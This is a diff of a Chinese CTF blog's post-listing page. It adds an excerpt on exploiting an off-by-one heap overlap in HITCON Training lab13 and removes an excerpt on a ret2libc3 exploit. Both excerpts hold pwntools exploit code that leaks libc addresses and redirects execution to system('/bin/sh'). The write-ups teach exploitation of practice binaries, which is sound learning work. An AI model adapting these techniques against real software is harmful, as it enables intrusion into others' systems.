@@ -225,6 +225,47 @@ exp #!/usr/bin/python3from pwn import *context(arch = &#39;amd64&#39;, os = &#
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>overlapping例题-HITCON_Training_lab13
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>overlapping例题-HITCON_Training_lab13 写在前面
+题目：HITCON-Training/LAB/lab13 at master · scwuaptx/HITCON-Training · GitHub
+虽然overlapping这个技术逻辑上不复杂，但这道题的利用还是挺麻烦的。
+不过这道题也算是独立做出来的第一道题，从发现漏洞点，到成功利用都没有看其他的资料。
+程序逻辑 首先我们了解一下程序创建heap的基本逻辑：
+我们可以将上面的流程简化为：
+可以看到，如果要创建一个heap，则会创建两个chunk。
+这是heap逻辑上的结构，而在内存中，如果我们创建两个heap，所有的chunk的排列方式位：
+漏洞逻辑 漏洞点在edit_heap()函数，按理来说cread_heap函数也有，但这里我们详细说edit_heap函数。
+可以看到这里的read_input函数的第二个函数，将heap的content大小传入其中，并在函数中采用read函数读取content大小的字符串：
+问题在于传入read函数的size大小，是content的大小，但read函数是从0开始计算的。
+也就是如果传入的是26，那么read函数会读取27个字节。
+这样就发生了off_by_one漏洞。
+又因为上面堆的结构，我们可以通过off_by_one覆盖chunk的size，从而实现overlapping：
+这时我们再free掉heap2的两个chunk，这时堆的结构就会变成：
+漏洞利用 上面说到了这个漏洞可以使用overlapping，那么我们需要考虑，overlapping之后，我们需要控制什么呢？很明显我们需要控制heap_manage中content_chunk指针。
+首先我们先创建三个heap，那么程序就会创建六个chunk，在堆中的分布如下：
+create(&#39;24&#39;, &#39;a&#39;*24)create(&#39;16&#39;, &#39;b&#39;*16)create(&#39;16&#39;, &#39;c&#39;*16) 这时我们通过heap1的content覆盖掉heap2_manage_chunk的size：
+overflow = b&#39;a&#39;*24 &#43; b&#39;\x81&#39;edit(&#39;0&#39;, overflow) 这时我们再free掉heap1和heap2。
+delete(&#39;0&#39;)delete(&#39;1&#39;) 注意这里需要先free掉heap1，再free掉heap2，原因是先让heap1进入fastbins。
+这时，fastbin的结构如下：
+这时我们需要先申请一个heap，来消耗掉fastbin的0x20链表中的前两个chunk。
+然后再申请一个chunk为0x80大小的content。这样就可以控制heap3的heap3_manage_chunk。
+**注意：**这里一定要先申请一个heap，否则在覆盖heap3_manage_chunk时，会破坏heap2_manage_chunk的结构。
+这里我们创建heap2时就输入content，覆盖掉heap3_manage_chunk中user_data的低八字节。
+create(&#39;16&#39;, &#39;d&#39;*16)payload = b&#39;a&#39;*0x40 &#43; p64(16) &#43; p64(0x602060)create(&#39;112&#39;, payload) 此时堆的结构如下：
+**注意：**带颜色的部分是原本的堆结构，新的结构是白字所示
+可以看到此时，如果我们编辑heap2的content，就会破坏heap1_manage_chunk，但是因为heap1没什么用，破坏就破坏掉吧。
+这里我们修改，让其指向atoi函数的got表，然后show(heap3)，就可以将atoi的地址打印出来，这样就可以获得基地址，计算出system函数地址。
+show(&#39;2&#39;)p.recvuntil(&#39;Content : &#39;)atoi = u64(p....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to overlapping例题-HITCON_Training_lab13" href="https://jellyfish-pro.github.io/ctf/overlapping%E4%BE%8B%E9%A2%98-hitcon_training_lab13/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>ret2csuinit_new
     </h2>
   </header>
@@ -378,34 +419,6 @@ from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.10
   </div>
   <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
   <a class="entry-link" aria-label="post link to ret2libc3_new" href="https://jellyfish-pro.github.io/ctf/ret2libc3_new/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2>ret2libc3_old
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>首先查看文件基本属性：
-看到文件并没有开启PIE，所以代码段的地址是相对固定的。
-然后查看是否有system函数和/bin/sh
-可以看到并没有system函数，也没有/bin/sh
-搜索int 0x80也可以看到并没有：
-没有int 0x80也不能调用execve函数
-虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
-可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
-libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
-那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
-现在我们使用puts函数举例：
-​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
-所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
-payload = b&#39;a&#39;*(0x6c&#43;4) //padding&#43;p32(elf.plt[&#39;puts&#39;]) //使函数转跳到puts函数&#43;p32(main)	//puts函数的返回值&#43;p32(elf.got[&#39;puts&#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
-puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&#39;puts&#39;,hex(puts))	libc =LibcSearcher(&#39;puts&#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&#39;puts&#39;)	//计算基址system=libcbase&#43;libc.dump(&#39;system&#39;)	//计算出system函数的真实地址bin_sh=libcbase&#43;libc.dump(&#39;str_bin_sh&#39;)	///bin/sh的真实地址print(&#39;system&#39;,hex(system))print(&#39;binsh&#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
-因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
-payload2=b&#39;a&#39;*(0x64&#43;4)&#43;p32(system)&#43;p32(0xdeadbeef)&#43;p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)elf = ELF(&#39;./ret2libc3&#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&#39;a&#39;*(0x6c&#43;4)&#43;p32(elf....</p>
-  </div>
-  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
-  <a class="entry-link" aria-label="post link to ret2libc3_old" href="https://jellyfish-pro.github.io/ctf/ret2libc3_old/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
